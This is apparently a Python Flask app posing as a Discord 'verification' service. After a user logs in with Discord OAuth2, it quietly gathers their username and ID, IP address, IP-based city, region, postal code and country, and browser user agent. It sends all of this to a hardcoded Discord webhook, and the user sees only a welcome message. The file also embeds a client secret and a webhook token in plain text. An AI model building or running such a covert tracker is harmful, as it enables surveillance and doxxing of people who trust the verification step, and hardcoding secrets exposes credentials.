import os
import requests
from flask import Flask, request, redirect, render_template
from datetime import datetime
import pytz
import urllib.parse

app = Flask(__name__)
app.secret_key = os.urandom(24)

# Discord OAuth2情報
DISCORD_CLIENT_ID = "1366806821456838727"
DISCORD_CLIENT_SECRET = "4nsa1A8noxdUX_D54GYG0VXL4cCZJ1dX"
REDIRECT_URI = "https://verify-tr0-4.onrender.com/callback"

# Webhook URL（Discordで作成したものを使う）
WEBHOOK_URL = "https://discord.com/api/webhooks/1374794041178456116/Aj69orzMQtgBptVhkmTsLmko9GKrGbiv7fS1COSOrwX2i22xI5G5e4IGhAgAK5ngZUec"

# IP位置情報取得関数
def get_location(ip):
    try:
        res = requests.get(f"https://ipapi.co/{ip}/json/").json()
        return {
            "ip": ip,
            "city": res.get("city", "不明"),
            "region": res.get("region", "不明"),
            "postal": res.get("postal", "不明"),
            "country": res.get("country_name", "不明"),
        }
    except:
        return {"ip": ip, "city": "不明", "region": "不明", "postal": "不明", "country": "不明"}

# Webhook送信関数
def send_to_webhook(message_content):
    data = {
        "embeds": [
            {
                "title": "📥 新しいアクセス通知",
                "description": message_content,
                "color": 0x00ffcc
            }
        ]
    }
    try:
        res = requests.post(WEBHOOK_URL, json=data)
        if res.status_code not in [200, 204]:
            print(f"[!] Webhookエラー: {res.status_code} {res.text}")
    except Exception as e:
        print(f"[!] Webhook送信失敗: {e}")

# トップページ
@app.route('/')
def index():
    return render_template("login.html")

# Discordログイン開始
@app.route('/login')
def login():
    params = {
        "client_id": DISCORD_CLIENT_ID,
        "redirect_uri": REDIRECT_URI,
        "response_type": "code",
        "scope": "identify"
    }
    return redirect(f"https://discord.com/oauth2/authorize?{urllib.parse.urlencode(params)}")

# Discordからのコールバック
@app.route('/callback')
def callback():
    code = request.args.get("code")
    if not code:
        return "コードが見つかりません。", 400

    data = {
        "client_id": DISCORD_CLIENT_ID,
        "client_secret": DISCORD_CLIENT_SECRET,
        "grant_type": "authorization_code",
        "code": code,
        "redirect_uri": REDIRECT_URI,
        "scope": "identify"
    }

    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }

    token_response = requests.post("https://discord.com/api/oauth2/token", data=data, headers=headers)
    token_json = token_response.json()
    access_token = token_json.get("access_token")

    if not access_token:
        return f"[!] アクセストークンが取得できません。\nレスポンス: {token_json}", 400

    # ユーザー情報取得
    user_res = requests.get(
        "https://discord.com/api/users/@me",
        headers={"Authorization": f"Bearer {access_token}"}
    )
    user = user_res.json()
    username = f"{user['username']}#{user['discriminator']}"
    user_id = user['id']

    # IP・UAなど取得
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    location = get_location(ip)
    user_agent = request.headers.get("User-Agent", "不明")

    jst = pytz.timezone('Asia/Tokyo')
    now = datetime.now(jst).strftime("%Y-%m-%d %H:%M:%S")

    # Webhookに送るメッセージ
    message_content = (
        f"🕒 時間: {now}\n"
        f"👤 ユーザー: {username} (`{user_id}`)\n"
        f"🌍 IP: {location['ip']}\n"
        f"📍 地域: {location['region']}（{location['city']}）\n"
        f"〒 郵便番号: {location['postal']}\n"
        f"🗺️ マップ: https://www.google.com/maps?q={location['ip']}\n"
        f"🧭 国: {location['country']}\n"
        f"🖥️ UA: {user_agent}\n"
        f"Ultra Cyber Auth System"
    )

    send_to_webhook(message_content)
    return f"ようこそ、{username} さん！ 認証が完了しました。"

# アプリ起動
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
